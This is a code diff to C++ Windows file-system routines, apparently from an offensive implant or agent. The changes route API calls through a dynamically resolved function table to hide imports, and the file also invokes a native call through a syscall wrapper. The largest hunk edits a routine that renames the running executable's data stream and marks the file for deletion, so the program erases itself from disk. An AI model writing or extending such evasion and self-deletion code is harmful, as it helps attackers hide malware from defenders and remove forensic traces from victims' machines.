@@ -5,9 +5,9 @@ DWORD g_dwBytesTransferred = 0;
 namespace System::Fs
 {
     VOID CALLBACK FileIOCompletionRoutine(
-    DWORD dwErrorCode,
-    DWORD dwNumberOfBytesTransfered,
-    LPOVERLAPPED lpOverlapped
+        DWORD dwErrorCode,
+        DWORD dwNumberOfBytesTransfered,
+        LPOVERLAPPED lpOverlapped
     ) {
         // std::string sNumberOfBytesTransferred = std::to_string(dwNumberOfBytesTransfered);
         g_dwBytesTransferred = dwNumberOfBytesTransfered;
@@ -84,8 +84,11 @@ namespace System::Fs
         return hDir;
     }
 
-    std::vector<std::wstring> DirectoryGetFiles(Procs::PPROCS pProcs, const std::wstring& wDirPath, BOOL bRecurse)
-    {
+    std::vector<std::wstring> DirectoryGetFiles(
+        Procs::PPROCS pProcs,
+        const std::wstring& wDirPath,
+        BOOL bRecurse
+    ) {
         std::vector<std::wstring> files = {};
 
         WIN32_FIND_DATA ffd;
@@ -97,7 +100,7 @@ namespace System::Fs
         pProcs->lpRtlStringCchCopyW(wTargetDir, MAX_PATH, wDirPath.c_str());
         pProcs->lpRtlStringCchCatW(wTargetDir, MAX_PATH, TEXT("\\*"));
 
-        hFind = FindFirstFile(wTargetDir, &ffd);
+        hFind = pProcs->lpFindFirstFileW(wTargetDir, &ffd);
         if (hFind == INVALID_HANDLE_VALUE)
         {
             return files;
@@ -139,7 +142,7 @@ namespace System::Fs
             {
                 files.push_back(wFullPathName);
             }
-        } while (FindNextFile(hFind, &ffd) != 0);
+        } while (pProcs->lpFindNextFileW(hFind, &ffd) != 0);
 
         return files;
     }
@@ -466,7 +469,7 @@ namespace System::Fs
         renameInfo.RootDirectory = nullptr;
         renameInfo.FileNameLength = uniDest.Length;
 
-        RtlCopyMemory(renameInfo.FileName, uniDest.Buffer, uniDest.Length);
+        pProcs->lpRtlCopyMemory(renameInfo.FileName, uniDest.Buffer, uniDest.Length);
 
         status = CallSysInvoke(
             &pProcs->sysNtSetInformationFile,
@@ -559,7 +562,11 @@ namespace System::Fs
         SIZE_T dwStreamLength = wcslen(lpNewStream) * sizeof(wchar_t);
         SIZE_T dwRename = sizeof(FILE_RENAME_INFO) + dwStreamLength;
 
-        PFILE_RENAME_INFO pRename = (PFILE_RENAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwRename);
+        PFILE_RENAME_INFO pRename = (PFILE_RENAME_INFO)pProcs->lpHeapAlloc(
+            pProcs->lpGetProcessHeap(),
+            HEAP_ZERO_MEMORY,
+            dwRename
+        );
         if (!pRename)
         {
             return FALSE;
@@ -568,23 +575,23 @@ namespace System::Fs
         WCHAR wPath[MAX_PATH * 2] = {0};
         FILE_DISPOSITION_INFO fdi = {0};
 
-        ZeroMemory(wPath, sizeof(wPath));
-        ZeroMemory(&fdi, sizeof(FILE_DISPOSITION_INFO));
+        RtlZeroMemory(wPath, sizeof(wPath));
+        RtlZeroMemory(&fdi, sizeof(FILE_DISPOSITION_INFO));
 
         fdi.DeleteFile = TRUE;
 
         pRename->FileNameLength = dwStreamLength;
-        RtlCopyMemory(pRename->FileName, lpNewStream, dwStreamLength);
+        pProcs->lpRtlCopyMemory(pRename->FileName, lpNewStream, dwStreamLength);
 
         // Get the path for the current executable itself.
-        if (GetModuleFileNameW(NULL, wPath, MAX_PATH * 2) == 0)
+        if (pProcs->lpGetModuleFileNameW(NULL, wPath, MAX_PATH * 2) == 0)
         {
             return FALSE;
         }
 
         // Rename
         HANDLE hFile;
-        hFile = CreateFileW(
+        hFile = pProcs->lpCreateFileW(
             wPath,
             DELETE | SYNCHRONIZE,
             FILE_SHARE_READ,
@@ -604,10 +611,10 @@ namespace System::Fs
             return FALSE;
         }
 
-        CloseHandle(hFile);
+        pProcs->lpCloseHandle(hFile);
 
         // Delete
-        hFile = CreateFileW(
+        hFile = pProcs->lpCreateFileW(
             wPath,
             DELETE | SYNCHRONIZE,
             FILE_SHARE_READ,
@@ -626,8 +633,9 @@ namespace System::Fs
             return FALSE;
         }
 
-        CloseHandle(hFile);
+        pProcs->lpCloseHandle(hFile);
+        pProcs->lpHeapFree(pProcs->lpGetProcessHeap(), 0, pRename);
 
-        HeapFree(GetProcessHeap(), 0, pRename);
+        return TRUE;
     }
 }
